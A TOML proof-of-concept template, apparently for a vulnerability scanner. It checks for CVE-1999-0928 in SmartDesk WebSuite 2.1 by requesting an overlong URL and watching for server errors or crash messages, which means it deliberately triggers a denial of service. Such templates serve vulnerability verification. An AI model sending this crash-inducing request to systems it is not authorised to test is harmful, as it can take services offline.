[info]
author = "ave"
description = "验证 SmartDesk WebSuite 2.1 缓冲区溢出漏洞，发送超长 URL 触发拒绝服务"
id = "POC-AVE-1999-0728"
name = "CVE-1999-0928 PoC"
severity = "medium"
tags = ["ave-1999-0728"]
vuln_id = [
    "CVE-1999-0928",
    "AVE-1999-0728",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{long_url}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Server Error",
    "Internal Server Error",
    "Segmentation fault",
    "Bus error",
]
